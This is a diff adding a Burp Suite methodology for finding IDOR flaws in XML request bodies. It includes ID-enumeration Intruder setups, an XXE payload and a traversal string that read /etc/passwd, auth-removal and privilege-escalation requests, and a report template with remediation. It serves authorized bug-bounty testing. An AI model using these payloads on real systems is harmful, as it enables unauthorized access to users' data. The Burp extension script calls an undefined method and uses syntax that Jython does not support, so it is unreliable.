@@ -9740,3 +9740,667 @@ Cookie: session=attacker
 
 ---
 
+# 🎯 **Bug #19: XML Body IDOR - Complete Burp Suite Methodology**
+
+## 📋 **Bug Description**
+**IDOR in XML Body** - Manipulating object references within XML request bodies where the application fails to validate user authorization when processing XML data.
+
+---
+
+## 🔍 **PHASE 1: RECONNAISSANCE & DETECTION**
+
+### **Step 1.1: Identify XML Endpoints**
+First, find all endpoints that accept XML requests:
+
+**Burp Filters:**
+```
+Proxy → HTTP History → Filter by MIME type: XML
+Extension: .xml
+Content-Type: application/xml
+Content-Type: text/xml
+```
+
+**Search Patterns in Burp:**
+```
+Ctrl+F or "Search" tab → Search for:
+- <?xml
+- <xml
+- application/xml
+- text/xml
+- Content-Type: application/xml
+```
+
+### **Step 1.2: Map XML Parameters**
+Document all XML parameters that might contain IDs:
+
+```xml
+<!-- Common XML ID patterns to look for -->
+<id>123</id>
+<userId>456</userId>
+<accountId>789</accountId>
+<documentID>abc-123</documentID>
+<reference>USER-001</reference>
+<owner>current_user</owner>
+<profileId>7890</profileId>
+```
+
+### **Step 1.3: Create Target List**
+Create a spreadsheet/document with:
+| Endpoint | Method | XML Structure | ID Parameters | Auth Required |
+|----------|--------|---------------|---------------|---------------|
+| /api/users | POST | `<user><id>123</id></user>` | id, userId | Yes |
+| /updateProfile | PUT | `<profile><uid>456</uid></profile>` | uid | Yes |
+
+---
+
+## 🛠️ **PHASE 2: BURP SUITE CONFIGURATION**
+
+### **Step 2.1: Burp Proxy Setup**
+```
+Proxy → Options → Intercept Client Requests:
+- Add rule: "Content-Type contains xml"
+- Enable interception for XML requests
+```
+
+### **Step 2.2: Configure Match and Replace**
+```
+Proxy → Options → Match and Replace:
+Add Rule:
+  Type: Request header
+  Match: Content-Type: application/json
+  Replace: Content-Type: application/xml
+  (This helps convert JSON endpoints to XML)
+```
+
+### **Step 2.3: Setup Scope**
+```
+Target → Scope:
+1. Add all relevant domains/IPs
+2. Enable: "Use advanced scope control"
+3. Check: "Include in scope based on the following:"
+```
+
+---
+
+## 🔬 **PHASE 3: MANUAL TESTING WITH BURP REPEATER**
+
+### **Step 3.1: Baseline Request**
+Send a legitimate XML request to Repeater:
+
+```xml
+POST /api/user/profile HTTP/1.1
+Host: target.com
+Content-Type: application/xml
+Authorization: Bearer [your_token]
+
+<request>
+    <userId>100</userId>
+    <action>view</action>
+</request>
+```
+
+### **Step 3.2: Basic ID Manipulation**
+
+**Technique 19.1: Sequential ID Testing**
+```xml
+<!-- Original -->
+<userId>100</userId>
+
+<!-- Test 1: Increment -->
+<userId>101</userId>
+
+<!-- Test 2: Decrement -->
+<userId>99</userId>
+
+<!-- Test 3: Zero -->
+<userId>0</userId>
+
+<!-- Test 4: Negative -->
+<userId>-100</userId>
+```
+
+**Burp Repeater Setup:**
+```
+Right-click request → Send to Repeater
+Create tabs for each test case
+Use "Go" button to send each variation
+Compare responses
+```
+
+### **Step 3.3: XML Structure Variations**
+
+**Technique 19.2: Parameter Location Changes**
+```xml
+<!-- Move ID to different XML elements -->
+<request>
+    <user>
+        <identifier>101</identifier>
+    </user>
+</request>
+
+<!-- Try attributes instead of elements -->
+<request>
+    <user id="101"></user>
+</request>
+
+<!-- Nested structures -->
+<request>
+    <data>
+        <profile>
+            <userId>101</userId>
+        </profile>
+    </data>
+</request>
+```
+
+### **Step 3.4: ID Format Variations**
+
+**Technique 19.3: Format Manipulation**
+```xml
+<!-- Different numeric formats -->
+<userId>100.0</userId>
+<userId>0x64</userId>
+<userId>0144</userId>
+<userId>1.0E2</userId>
+
+<!-- String formats -->
+<userId>'100'</userId>
+<userId>"100"</userId>
+<userId> 100 </userId>
+```
+
+---
+
+## 🤖 **PHASE 4: AUTOMATED TESTING WITH BURP INTRUDER**
+
+### **Step 4.1: Configure Intruder Attack**
+
+**Target Request:**
+```xml
+POST /api/user/profile HTTP/1.1
+Host: target.com
+Content-Type: application/xml
+Authorization: Bearer [your_token]
+
+<request>
+    <userId>§100§</userId>
+</request>
+```
+
+### **Step 4.2: Payload Configuration**
+
+**Payload Set 1: Sequential Numbers**
+```
+Payload type: Numbers
+Range: 1-1000 (or 1-10000)
+Step: 1
+Number format: Decimal
+```
+
+**Payload Set 2: Common ID Wordlist**
+```
+admin
+0
+1
+999
+1000
+1001
+-1
+999999
+0001
+001
+```
+
+**Payload Set 3: Fuzzing Payloads**
+```
+../../etc/passwd
+${100}
+{{100}}
+<![CDATA[100]]>
+<!--100-->
+%31%30%30
+```
+
+### **Step 4.3: Attack Settings**
+
+**Resource Pool:**
+```
+Intruder → Resource Pool:
+- Maximum concurrent requests: 5-10 (be gentle)
+- Delay between requests: 100-500ms
+```
+
+**Grep - Extract:**
+```
+Add items to extract from responses:
+- Response code
+- Content-Length
+- Error messages
+- User data patterns
+```
+
+**Grep - Match:**
+```
+Add strings to match:
+- "unauthorized"
+- "forbidden"
+- "access denied"
+- "not found"
+- "success"
+- username of other users
+```
+
+---
+
+## 🎨 **PHASE 5: ADVANCED XML TECHNIQUES**
+
+### **Step 5.1: XML External Entities (XXE) Combined**
+
+**Test for XXE while testing IDOR:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [  
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<request>
+    <userId>&xxe;</userId>
+    <action>view</action>
+</request>
+```
+
+### **Step 5.2: XML Parameter Pollution**
+
+**Multiple ID parameters:**
+```xml
+<request>
+    <userId>100</userId>
+    <userId>101</userId>
+    <userId>102</userId>
+</request>
+```
+
+**Nested conflicts:**
+```xml
+<request>
+    <user>
+        <id>100</id>
+    </user>
+    <userId>101</userId>
+</request>
+```
+
+### **Step 5.3: XML Comments for ID Obfuscation**
+```xml
+<request>
+    <userId><!-- Admin ID -->101</userId>
+    <userId>100<!-- Actual user --></userId>
+</request>
+```
+
+---
+
+## 📊 **PHASE 6: RESPONSE ANALYSIS**
+
+### **Step 6.1: Response Comparison Matrix**
+
+Create comparison table in Burp:
+```
+Right-click response → "Show response in browser"
+Or use "Comparer" tab:
+1. Send baseline response to Comparer
+2. Send test response to Comparer
+3. Compare words/lines
+```
+
+**Track in spreadsheet:**
+| Test ID | Parameter | Value | Status Code | Content-Length | Response Contains | Vulnerable? |
+|---------|-----------|-------|-------------|----------------|-------------------|-------------|
+| 001 | userId | 100 | 200 | 2543 | "John Doe" | Baseline |
+| 002 | userId | 101 | 200 | 2678 | "Jane Smith" | YES |
+| 003 | userId | 99 | 403 | 124 | "Forbidden" | NO |
+
+### **Step 6.2: Response Analysis Filters**
+
+**Burp Filters for Analysis:**
+```
+Proxy → HTTP History → Filter:
+- Add filter: Status code: 200 (ignore 403/404)
+- Add filter: Content length != baseline_length
+- Search response for "email", "address", "ssn", etc.
+```
+
+---
+
+## 🔄 **PHASE 7: CONTEXT-BASED TESTING**
+
+### **Step 7.1: Different HTTP Methods**
+Test same XML with different methods:
+
+```bash
+# Original POST
+POST /api/user/profile
+
+# Try GET with XML body
+GET /api/user/profile
+Content-Type: application/xml
+
+<userId>101</userId>
+
+# Try PUT
+PUT /api/user/profile
+# Same XML body
+
+# Try PATCH
+PATCH /api/user/profile
+# Same XML body
+```
+
+### **Step 7.2: Different Endpoints**
+Apply same XML ID manipulation across endpoints:
+
+**Profile endpoint:**
+```
+POST /api/user/profile
+XML: <userId>101</userId>
+```
+
+**Settings endpoint:**
+```
+POST /api/user/settings
+XML: <userId>101</userId>
+```
+
+**Documents endpoint:**
+```
+POST /api/user/documents
+XML: <owner>101</owner>
+```
+
+### **Step 7.3: Chained IDOR Testing**
+```xml
+<!-- Step 1: Get list of users -->
+<request>
+    <action>list</action>
+</request>
+
+<!-- Step 2: Use discovered IDs -->
+<request>
+    <userId>102</userId>
+    <action>view_profile</action>
+</request>
+
+<!-- Step 3: Access related data -->
+<request>
+    <userId>102</userId>
+    <action>view_documents</action>
+</request>
+```
+
+---
+
+## 🎭 **PHASE 8: AUTHENTICATION BYPASS TECHNIQUES**
+
+### **Step 8.1: Token Manipulation**
+```xml
+<!-- Remove auth token -->
+POST /api/user/profile
+Content-Type: application/xml
+<!-- No Authorization header -->
+
+<userId>101</userId>
+```
+
+### **Step 8.2: Session Reuse**
+```xml
+<!-- Use your token, try other user's ID -->
+Authorization: Bearer [YOUR_TOKEN]
+<userId>[VICTIM_ID]</userId>
+```
+
+### **Step 8.3: Privilege Escalation**
+```xml
+<!-- Try admin functions with user token -->
+<request>
+    <userId>1</userId>  <!-- Admin ID -->
+    <action>deleteUser</action>
+    <targetId>102</targetId>
+</request>
+```
+
+---
+
+## 📈 **PHASE 9: BURP EXTENSIONS FOR IDOR**
+
+### **Recommended Extensions:**
+
+1. **Autorize** - Automated authorization testing
+```
+BApp Store → Install Autorize
+Configure:
+- Add your auth token
+- Enable: "Auto detect unauthenticated"
+- Run through your XML endpoints
+```
+
+2. **AuthMatrix** - Matrix-based authorization testing
+```
+Create matrix with:
+- Users: [user1, user2, admin]
+- Roles: [normal, power, admin]
+- Endpoints: [XML endpoints]
+- Test each combination
+```
+
+3. **JSON Web Tokens** - For JWT in XML
+```
+Decode/encode JWT tokens
+Modify claims
+Test with modified tokens in XML
+```
+
+4. **Turbo Intruder** - High-speed attacks
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=5,
+                          requestsPerConnection=100,
+                          pipeline=False)
+    
+    for word in open('ids.txt'):
+        engine.queue(target.req, word.rstrip())
+```
+
+---
+
+## 📝 **PHASE 10: DOCUMENTATION & REPORTING**
+
+### **Step 10.1: Burp Project Save**
+```
+Project → Save copy of project
+Include:
+- HTTP History with findings
+- Intruder attacks
+- Repeater tabs
+- Scope configuration
+```
+
+### **Step 10.2: Evidence Collection**
+
+**For each vulnerability found:**
+1. **Request/Response pairs** (Burp → Save item)
+2. **Screenshots** of successful access
+3. **Video proof** if possible
+4. **Impact demonstration**
+
+### **Step 10.3: Report Template**
+
+```markdown
+# IDOR Vulnerability Report - XML Body Manipulation
+
+## Vulnerability Title
+IDOR in User Profile API (XML endpoint)
+
+## Endpoint
+POST /api/user/profile
+
+## Description
+The application fails to validate user authorization when processing XML requests, allowing authenticated users to access other users' profiles by modifying the userId parameter in the XML body.
+
+## Steps to Reproduce
+1. Login as user "attacker"
+2. Capture the profile request:
+   POST /api/user/profile
+   Content-Type: application/xml
+   
+   <request>
+       <userId>100</userId>
+   </request>
+
+3. Modify userId to 101:
+   <request>
+       <userId>101</userId>
+   </request>
+
+4. Observe response contains victim's personal data
+
+## Proof of Concept
+[Burp request/response screenshots]
+
+## Impact
+- Unauthorized access to personal information
+- Data breach of PII
+- Account takeover potential
+
+## CVSS Score
+7.5 (High) - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
+
+## Remediation
+- Implement server-side authorization checks
+- Use session-based user identification
+- Avoid client-supplied object references
+```
+
+---
+
+## 🎯 **SPECIFIC XML IDOR TEST CASES**
+
+### **Test Case Matrix for Bug #19**
+
+| Test ID | Technique | XML Payload | Expected Result |
+|---------|-----------|-------------|-----------------|
+| 19-01 | Sequential ID | `<id>101</id>` | Access other user |
+| 19-02 | Negative ID | `<id>-100</id>` | Possible bypass |
+| 19-03 | Zero ID | `<id>0</id>` | Admin access? |
+| 19-04 | Large number | `<id>999999</id>` | Error leak |
+| 19-05 | String ID | `<id>admin</id>` | String-based ID |
+| 19-06 | Encoded | `<id>%31%30%31</id>` | Encoding bypass |
+| 19-07 | Multi-element | `<userid>101</userid>` | Parameter variation |
+| 19-08 | Attribute | `<user id="101">` | Attribute injection |
+| 19-09 | Nested | `<user><id>101</id></user>` | Deep reference |
+| 19-10 | CDATA | `<id><![CDATA[101]]></id>` | CDATA bypass |
+
+---
+
+## ⚡ **AUTOMATION SCRIPTS FOR BURP**
+
+### **Python Script for Burp Extender API**
+```python
+from burp import IBurpExtender, IHttpListener
+import re
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("XML IDOR Hunter")
+        callbacks.registerHttpListener(self)
+        print("XML IDOR Hunter loaded")
+        
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if not messageIsRequest:
+            return
+            
+        request = messageInfo.getRequest()
+        analyzedRequest = self._helpers.analyzeRequest(request)
+        
+        # Check if XML
+        headers = analyzedRequest.getHeaders()
+        content_type = [h for h in headers if "Content-Type" in h and "xml" in h.lower()]
+        
+        if content_type:
+            body = request[analyzedRequest.getBodyOffset():].tostring()
+            
+            # Find IDs in XML
+            ids = re.findall(r'<(\w+?)>(\d+)</\1>', body)
+            if ids:
+                print(f"Found IDs in XML: {ids}")
+                # Add to Intruder
+                self.addToIntruder(messageInfo, ids)
+```
+
+---
+
+## 📚 **RESOURCES & CHEAT SHEETS**
+
+### **Quick Reference: XML IDOR Payloads**
+```
+# Basic ID swaps
+<id>101</id>
+<userId>102</userId>
+<account>103</account>
+
+# Encoded payloads
+<id>%31%30%31</id>
+<id>&#49;&#48;&#49;</id>
+
+# XML-specific
+<id><![CDATA[101]]></id>
+<id>101</id>  <!-- Hidden comment -->
+<id>101</id>  <!-- Try XXE -->
+
+# Arrays in XML
+<ids>
+    <id>100</id>
+    <id>101</id>
+</ids>
+
+# Complex structures
+<request>
+    <user type="victim">
+        <identifier>101</identifier>
+    </user>
+</request>
+```
+
+### **Success Indicators**
+- ✅ Status 200 OK (not 403/401)
+- ✅ Content length differs from baseline
+- ✅ Response contains other users' data
+- ✅ No authorization headers required
+- ✅ Admin functions accessible
+- ✅ Database errors showing data
+
+### **False Positive Checks**
+- ❌ Is it actually your data? (Check names/emails)
+- ❌ Is it cached content? (Clear cache and retest)
+- ❌ Is it public data? (Check if unauthenticated access works)
+- ❌ Is it a test account? (Verify with production data)
+
+---
+
+## 🏆 **PRO TIPS**
+
+1. **Use Burp Collaborator** for blind IDOR
+2. **Check WebSockets** - Often have XML IDORs
+3. **Test mobile API** - Different endpoints, same XML
+4. **Version history** - Try older API versions
+5. **Debug parameters** - Add `debug=true` to XML
+6. **Admin functions** - Test for hidden admin IDs
+7. **Race conditions** - Concurrent XML requests
+8. **Cache poisoning** - Modify IDs in cached responses
+
+---
+
+
+
